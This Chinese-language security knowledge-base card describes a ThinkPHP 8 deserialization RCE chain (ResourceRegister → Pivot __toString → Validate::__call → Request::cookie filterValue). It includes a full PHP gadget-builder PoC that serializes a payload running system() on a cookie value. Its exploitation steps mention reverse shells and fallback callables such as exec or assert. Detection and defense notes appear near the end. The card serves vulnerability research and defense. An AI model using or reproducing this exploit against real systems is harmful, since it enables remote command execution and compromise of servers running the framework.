---
id: web-php-deserialization-thinkphp8-resourceregister-pivot-validate-cookie-filtervalue-rce
title: ThinkPHP 8 反序列化链：ResourceRegister::__destruct → Resource::parseGroupRule → Pivot __toString → Validate::__call → Request::cookie 落到 filterValue call_user_func
type: scenario
domain: web
path: web/php/deserialization
technique: thinkphp8-resourceregister-pivot-validate-cookie-filtervalue-rce
tags:
- php
- thinkphp
- deserialization
- pop-chain
- magic-method
- tostring
- call_user_func
- rce
cve: []
severity: critical
confidence: high
status: verified
created: '2026-11-08'
updated: '2026-11-08'
verification:
  verified_by: verifier-V295
  verified_at: '2026-11-08T08:01:25+08:00'
  notes: 已完整读 content.md 与全部49张图核对：Kunlun-M扫链(图01-02)、TP8多应用配置(图03-04)、Validate::__call/is(图05/08/13)、Request::filterValue/cookie/getFilter/getData(图06-07/15-20)、失败分支Arr::first参数不可控(图11-12/14)、成功sink system通过cookie filter(图21-24)、__toString候选与Url类型错误(图25-32)、Conversion(trait)__toString→toJson→toArray→appendAttrToArray→getRelationWith→relation->visible(图33-40)、Model使用Conversion与Pivot继承Model(图38-40)、Resource/ResourceRegister闭合(图47-48)、最终调用栈Request.php:1406→Validate.php:836/864/1700→Conversion.php:321/306/252/366/371→Resource.php:96→ResourceRegister.php:51/69(图49)，均与原文一致。修正：原文最终payload写visible='yyy'但调试截图实际命中cookie键'1'；将卡内PoC/步骤由true改为字符串'1'（更符合截图且规避严格类型下bool→string参数类型错误），staging与knowledge卡文件均已改后kb verify。dedup最高分为卡自身exact自匹配；related候选均为ThinkPHP6不同入口/中段链(dup-scan 3个pair均verdict=related)，非同链不合并。affected_versions：原文仅写thinkphp8未给具体区间，未set-versions。未验证点：未实跑PHP复现。
url: /docs/web/php/deserialization/web-php-deserialization-thinkphp8-resourceregister-pivot-validate-cookie-filtervalue-rce/
draft: false
kb_aliases:
- ThinkPHP8 反序列化
- TP8 POP 链
- ResourceRegister __destruct
- Resource parseGroupRule toString
- Pivot Conversion __toString
- Validate __call is
- Request cookie filterValue system
---

## 一句话结论

ThinkPHP 8 中存在一条可闭合的反序列化 RCE 链：入口 `think\route\ResourceRegister::__destruct()` 调用 `register()` → `Resource::parseGroupRule()`，在拼接路由字符串时把 `$option['var'][$val]` 当字符串使用，触发 `think\model\Pivot`（使用 `Conversion` trait）的 `__toString()`；`Conversion::toJson → toArray → appendAttrToArray → getRelationWith` 里执行 `$relation->visible($visible[$key])`，`$relation` 为 `think\Validate` 对象且无 `visible` 方法，进入 `Validate::__call` → `is()` → `call_user_func_array($this->type[$rule], [$value])` 调用 `think\Request::cookie()`；最终 `Request::cookie → filterValue` 对可控 cookie 值执行 `call_user_func($filter, $value)`，`filter='system'` 即命令执行。

## 原理

- **Source：析构器驱动注册**：`ResourceRegister::__destruct()` 调用 `$this->register()`，`register()` 内 `$this->resource->parseGroupRule('...')`。反序列化一个 `ResourceRegister` 即可在对象销毁时自动进入路由注册逻辑。
- **触发 `__toString`**：`Resource::parseGroupRule($rule)` 在 `str_contains($rule,'.')` 分支中 `foreach ($array as $val) { $item[] = $val . '/' . ($option['var'][$val] ?? $val . '_id') . '>'; }`。把 `option['var'][$val]` 设为对象，就会在字符串拼接时调用其 `__toString()`。
- **选 Pivot 作为 `__toString` 载体**：`Conversion` 是被 trait 修饰的代码复用单元，不能直接实例化；`think\model\Pivot extends Model` 使用了 `Conversion` trait，因此用 `Pivot` 实例即可走到 `Conversion::__toString()`。
- **`__toString` 不是终点**：`Conversion::__toString()` 返回 `$this->toJson()`，`toJson()` 返回 `json_encode($this->toArray())`，因此实际进入 `toArray()`。
- **toArray → 关系属性**：`toArray()` 遍历 `$this->append`，对每项调用 `appendAttrToArray($item, $key, $name, $visible, $hidden)`；当 `$name` 形如 `yyy.ttt`（含 `.`）时 `[$key,$attr] = explode('.', $name)`，再 `getRelationWith($key, $hidden, $visible)`。
- **关系对象任意方法调用**：`getRelationWith()` 中 `$relation = $this->getRelation($key, true)`；`getRelation()` 在 `array_key_exists($name, $this->relation)` 时直接返回 `$this->relation[$name]`（攻击者设为任意对象，如 `Validate`）。随后 `$relation->visible($visible[$key])` 调用一个不存在于 `Validate` 的方法。
- **`Validate::__call` 把方法名变规则名**：`__call($method,$args)` 先判断方法名前两位是否为 `is`（是则去掉），然后 `array_push($args, lcfirst($method))` 并把方法名作为最后一个参数，`call_user_func_array([$this,'is'], $args)`。调用 `visible($v)` 等价于 `is($v, 'visible')`。
- **`is()` 按 `type[$rule]` 调任意可调用**：`is($value, string $rule, array $data=[])` 内 `if (isset($this->type[$rule])) { $result = call_user_func_array($this->type[$rule], [$value]); }`。把 `type['visible']` 设为 `[new Request(), 'cookie']`，则执行 `Request::cookie($value)`。
- **Sink：`Request::cookie → filterValue`**：`cookie($name, $default, $filter)` 中 `$data = $name ? getData($this->cookie,$name,$default) : $this->cookie`，`$filter = getFilter($filter,$default)`（无显式 filter 时回退到 `$this->filter`，字符串按逗号拆成数组并追加 default）；数组数据走 `array_walk_recursive($data, [$this,'filterValue'], $filter)`，标量走 `$this->filterValue(...)`；`filterValue` 对每个 `is_callable($filter)` 的过滤器执行 `call_user_func($filter, $value)`。设 `Request::$filter='system'`、`Request::$cookie` 含命令字符串，即 `system('命令')`。
- **为什么闭合**：每一环都是框架内合法的方法/属性语义被重新组合：析构自动执行、字符串拼接触发 `__toString`、关系属性触发任意对象方法、`__call` 把方法名当规则名、`type` 允许任意 callable、`filter` 允许任意函数名。没有一处校验对象类型或可调用白名单。
- **边界**：需要存在未限制 `allowed_classes` 的 `unserialize` 入口；`disable_functions` 未禁 `system`（可换其它单参可调用）；PHP 8 下类型声明严格，`$value` 需为能命中 cookie 键的字符串；调试截图显示实际命中 cookie 键 `"1"`（原文最终 payload 代码写 `"yyy"`，与截图不符，本卡按截图采用 `"1"`）；不同 ThinkPHP 8 小版本的属性名/方法行号可能变化。

## 触发条件

- 目标为 ThinkPHP 8（原文用 `composer create-project topthink/think thinkphp8` + `topthink/think-multi-app` 搭建），存在可控 `unserialize` 入口。
- 未设置 `allowed_classes` 白名单，或放行了 `think\route\ResourceRegister`、`think\model\Pivot`、`think\Validate`、`think\Request`。
- `disable_functions` 未禁用 `system`（或可用其它单参数可调用名替代）。
- 目标类文件未被裁剪（`ResourceRegister`、`Resource`、`Pivot`、`Conversion`、`Validate`、`Request` 均存在）。
- 仅用于授权测试。

## 利用步骤

1. 确认反序列化入口（如 `unserialize(base64_decode($_GET[...]))`）与 ThinkPHP 版本。
2. 构造 `ResourceRegister`：`resource = new Resource()`；`Resource` 的 `option = ['var' => ['ppp' => new Pivot()]]`，`rule` 设为 `'ppp.sss'`，使 `parseGroupRule` 进入含 `.` 的分支并在拼接 `$option['var']['ppp']` 时触发 `Pivot::__toString()`。
3. 构造 `Pivot`：`append = ['eee' => 'yyy.ttt']`（进入关系属性分支）、`relation = ['yyy' => new Validate()]`、`visible = ['yyy' => <命中 cookie 键的值>]`。调试截图显示实际命中的是 cookie 键 `"1"`，故设 `visible['yyy']='1'`，配合 `Request::$cookie=['1'=>命令]`。
4. 构造 `Validate`：`type = ['visible' => [new Request(), 'cookie']]`。`__call('visible',[$value])` 会转成 `is($value,'visible')`，命中该 callable。
5. 构造 `Request`：`cookie = ['1' => 'open -a Calculator']`（或目标系统命令）、`filter = 'system'`。
6. 序列化后 `urlencode/base64` 投递；观察命令执行（原文弹计算器；实战换成写文件/反弹 shell）。
7. 若 `system` 被禁，把 `filter` 换成其它单参数可调用（`exec`、`assert` 视版本），或选择其它接受单参数的 sink 方法。

## PoC

原文最终 gadget 的关键结构（PHP 8；私有/受保护属性需按类作用域书写，实际利用时用反射或对应命名空间下的构造代码生成）：

```php
<?php
namespace think;
class Request {
    protected $cookie = ["1" => "open -a Calculator"];
    protected $filter;
    public function __construct() {
        $this->filter = "system";
    }
}

class Validate {
    protected $field = [];
    protected $type  = [];
    public function __construct() {
        $this->field = ['ddd'];
        $this->type  = ['visible' => [new Request(), 'cookie']];
    }
}

namespace think\model;
use think\Validate;
class Pivot {
    protected $append   = [];
    private   $relation = [];
    protected $visible  = [];
    protected $name;
    public function __construct() {
        $this->append   = ["eee" => "yyy.ttt"];
        $this->relation = ["yyy" => new Validate()];
        $this->visible  = ["yyy" => "1"];  // 与 Request::$cookie 的键 "1" 对应
        $this->name     = "uuu";
    }
}

namespace think\route;
use think\model\Pivot;
class Resource {
    protected $rule   = "ppp.sss";
    protected $option = [];
    public function __construct() {
        $this->option = ["var" => ["ppp" => new Pivot()]];
    }
}
class ResourceRegister {
    protected $resource;
    public function __construct() {
        $this->resource = new Resource();
    }
}

namespace {
    use think\route\ResourceRegister;
    echo urlencode(base64_encode(serialize(new ResourceRegister())));
}
```

调用栈（原文动态调试）：

```text
Request.php:1406  think\Request->filterValue()
Request.php:1123  think\Request->cookie()
Validate.php:836  call_user_func_array
Validate.php:864  think\Validate->is()
Validate.php:1700 think\Validate->__call()
Conversion.php:321 think\Model->getRelationWith()
Conversion.php:306 think\Model->appendAttrToArray()
Conversion.php:252 think\Model->toArray()
Conversion.php:366 think\Model->toJson()
Conversion.php:371 think\Model->__toString()
Resource.php:96   think\route\Resource->parseGroupRule()
ResourceRegister.php:51 think\route\ResourceRegister->register()
ResourceRegister.php:69 think\route\ResourceRegister->__destruct()
```

说明：原文最终 payload 代码中 `visible` 写作字符串 `"yyy"`，但调试截图显示实际命中的是 cookie 键 `"1"`；本卡据此改用字符串 `"1"`（避免严格类型下布尔传入 string 参数引发类型错误），并注明 `visible` 的值必须与 `Request::$cookie` 的键匹配。`open -a Calculator` 为原文 macOS 环境命令，Windows/Linux 换成 `calc.exe`/`id` 等。

## 变体与关联

- **失败分支（直接 call_user_func_array sink）**：原文先尝试让 `Validate::is` 的 `call_user_func_array($this->type[$rule], [$value])` 直接调用 `proc_open` 一类函数，但第二个参数被 `[$value]` 包成数组，且 value 本身是数组，目标函数参数类型不匹配，利用失败；成功分支改用 `Request::cookie` 这种“单参数 + 内部控制 filter/cookie”的 sink。
- **同框架其它入口/后半链**：ThinkPHP 6 已有 `Model::__destruct → lazySave → ... → __toString`（[[web-php-deserialization-thinkphp6-model-destruct-tostring-chain]]）与 `Conversion.toArray → withAttr 回调`（[[web-php-deserialization-thinkphp6-conversion-toarray-withattr-callback-rce]]）；本卡是 ThinkPHP 8 的 `ResourceRegister` 入口 + `Validate::__call` 中段 + `Request::cookie` sink，属不同链。
- **同一 filterValue sink**：ThinkPHP 6 CVE-2022-45982 链也最终落到 `Request::filterValue` 的 `call_user_func($filter,$value)`（[[web-php-deserialization-thinkphp6-model-relationwrite-store-param-filter-system]]），但入口、版本与中段（Channel/Store vs Validate::__call）不同。
- **检测思路**：反序列化数据中出现 `ResourceRegister`、`Pivot`、`Validate`、`Request` 的组合，或 `type` 属性的值为 `[对象,'方法']` 形式；请求参数同时携带 `filter=system` 之类字符串。
- **关联**：[[web-php-deserialization-thinkphp6-psr6cache-channel-socket-invoke-display-eval]]（ThinkPHP 另一条 `__call`/`call_user_func_array` RCE）。

## 检测与防御

- **检测**：审计所有 `unserialize` 调用，禁止用户输入直接进入；日志/流量中出现 `O:...:"think\\route\\ResourceRegister"`、`think\\model\\Pivot`、`think\\Validate` 等序列化类名；`type` 属性为 `[对象, 方法]` 或 `filter` 为函数名的异常请求；Web 进程出现 `system`/`exec` 子进程。
- **防御**：`unserialize($data, ['allowed_classes' => false])` 或改用 JSON；升级/打补丁并裁剪不必要的框架组件；`disable_functions` 禁用危险函数只是纵深防御，不能替代反序列化入口控制；对模板/路由等“用户可写配置”做类型校验，避免字符串拼接触发对象 `__toString`。
- **代码层**：`Resource::parseGroupRule` 等拼接点应显式校验 `$option['var'][$val]` 为字符串；`Validate::__call` 不应把任意方法名映射为规则名；`Request::filterValue` 的 `is_callable` 应限制白名单函数。
